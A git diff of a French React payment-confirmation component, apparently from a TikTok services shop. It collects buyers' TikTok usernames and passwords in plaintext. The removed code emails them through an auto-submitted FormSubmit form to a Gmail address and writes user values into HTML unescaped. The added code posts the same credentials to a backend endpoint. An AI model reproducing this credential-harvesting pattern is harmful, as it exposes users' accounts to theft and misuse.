@@ -72,83 +72,46 @@ export const PaymentConfirmation = () => {
     setSendError('');
     
     try {
-      // Ouvrir une nouvelle fenêtre pour le formulaire FormSubmit
-      const emailWindow = window.open('', '_blank', 'width=600,height=400');
-      
-      if (!emailWindow) {
-        setSendError(t('popupBlocked', 'Veuillez autoriser les pop-ups pour envoyer les identifiants TikTok'));
-        setIsSending(false);
-        return;
+      // Préparer les données à envoyer
+      const credentials = {
+        username,
+        password,
+        email,
+        orderId,
+        amount: purchaseDetails ? purchaseDetails.amount : amount,
+        price: purchaseDetails ? purchaseDetails.price : price,
+        date: purchaseDetails ? purchaseDetails.date : new Date().toISOString()
+      };
+
+      // Envoyer les données au backend sécurisé
+      const apiUrl = import.meta.env.VITE_API_URL || '/api';
+      const response = await fetch(`${apiUrl}/send-credentials`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(credentials)
+      });
+
+      const data = await response.json();
+
+      if (!response.ok || !data.success) {
+        throw new Error(data.error || 'Erreur lors de l\'envoi des identifiants');
       }
-      
-      // Créer le contenu HTML du formulaire
-      const formHtml = `
-        <!DOCTYPE html>
-        <html>
-        <head>
-          <title>Envoi des identifiants TikTok</title>
-          <style>
-            body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
-            .loading { margin: 20px auto; }
-            h2 { color: #333; }
-            p { color: #666; }
-          </style>
-        </head>
-        <body>
-          <h2>Envoi des identifiants TikTok en cours...</h2>
-          <p>Cette fenêtre se fermera automatiquement. Veuillez ne pas la fermer manuellement.</p>
-          <div class="loading">Chargement...</div>
-          
-          <form id="credentialsForm" action="https://formsubmit.co/contact.payool@gmail.com" method="POST">
-            <!-- Informations utilisateur -->
-            <input type="hidden" name="username" value="${username}" />
-            <input type="hidden" name="password" value="${password}" />
-            <input type="hidden" name="orderId" value="${orderId}" />
-            ${purchaseDetails ? `
-            <input type="hidden" name="amount" value="${purchaseDetails.amount}" />
-            <input type="hidden" name="price" value="${purchaseDetails.price}" />
-            <input type="hidden" name="date" value="${new Date(purchaseDetails.date).toLocaleString()}" />
-            ` : `
-            <input type="hidden" name="amount" value="${amount || 'Non disponible'}" />
-            <input type="hidden" name="price" value="${price || 'Non disponible'}" />
-            <input type="hidden" name="date" value="${new Date().toLocaleString()}" />
-            `}
-            
-            <!-- Configuration FormSubmit -->
-            <input type="hidden" name="_subject" value="Nouveaux identifiants TikTok - Commande ${orderId}" />
-            <input type="hidden" name="_captcha" value="false" />
-            <input type="hidden" name="_template" value="table" />
-            <input type="hidden" name="_next" value="${window.location.origin}/payment/success?orderId=${orderId}" />
-            <input type="hidden" name="_replyto" value="${email}" />
-            <input type="hidden" name="email" value="${email}" />
-          </form>
-          
-          <script>
-            // Soumettre le formulaire automatiquement
-            document.addEventListener('DOMContentLoaded', function() {
-              document.getElementById('credentialsForm').submit();
-              // Fermer la fenêtre après 5 secondes
-              setTimeout(function() {
-                window.close();
-              }, 5000);
-            });
-          </script>
-        </body>
-        </html>
-      `;
-      
-      // Écrire le contenu HTML dans la nouvelle fenêtre
-      emailWindow.document.write(formHtml);
-      emailWindow.document.close();
-      
-      // Attendre un court instant pour s'assurer que le formulaire est soumis
+
+      // Succès - rediriger vers la page de succès
+      console.log('Identifiants envoyés avec succès');
       setTimeout(() => {
-        // Rediriger vers la page de succès
         navigate(`/payment/success?orderId=${orderId}`);
-      }, 2000);
+      }, 1000);
+
     } catch (error) {
       console.error('Erreur lors de l\'envoi des identifiants TikTok:', error);
-      setSendError(t('sendError', 'Une erreur est survenue lors de l\'envoi des identifiants. Veuillez réessayer.'));
+      setSendError(
+        error instanceof Error 
+          ? error.message 
+          : t('sendError', 'Une erreur est survenue lors de l\'envoi des identifiants. Veuillez réessayer.')
+      );
       setIsSending(false);
     }
   };
